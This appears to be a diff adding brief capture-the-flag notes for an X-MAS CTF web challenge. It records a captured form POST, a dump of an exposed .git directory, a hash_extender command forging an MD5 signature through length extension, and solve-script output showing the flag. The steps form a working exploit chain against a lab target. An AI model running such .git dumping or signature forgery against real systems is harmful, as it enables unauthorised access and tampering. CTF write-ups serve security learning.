@@ -1,0 +1,30 @@
+Post request:
+	Content-Disposition: form-data; name="state"
+
+	12 | 0
+	------WebKitFormBoundarytjdF8LdcJlF9ZpQ7
+	Content-Disposition: form-data; name="hash"
+
+	cf13ab76afb625f7f7d6c539c2cb3c84
+	------WebKitFormBoundarytjdF8LdcJlF9ZpQ7
+	Content-Disposition: form-data; name="item_id"
+
+	2
+
+
+python git_extract.py http://challs.xmas.htsp.ro:3003/.git/
+	challs.xmas.htsp.ro_3003
+
+helper.php
+	$secret = getenv("SECRET_THINGY"); // 64 random characters - impossible to guess
+
+Hash Length Extension attacks
+
+./hash_extender -d "12 | 0" -s cf13ab76afb625f7f7d6c539c2cb3c84 -a "13 | 13" -f md5 -l 67
+	Type: md5
+	Secret length: 67
+	New signature: 8ec4883990c9f7fc76f3514fcd5d4597
+	New string: 3132207c2030800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048020000000000003133207c203133
+
+python solve.py
+	{"state":"12 | 1337","hash":"52586134e945c681089af25c36a1866f","success":true,"item":"X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}"}
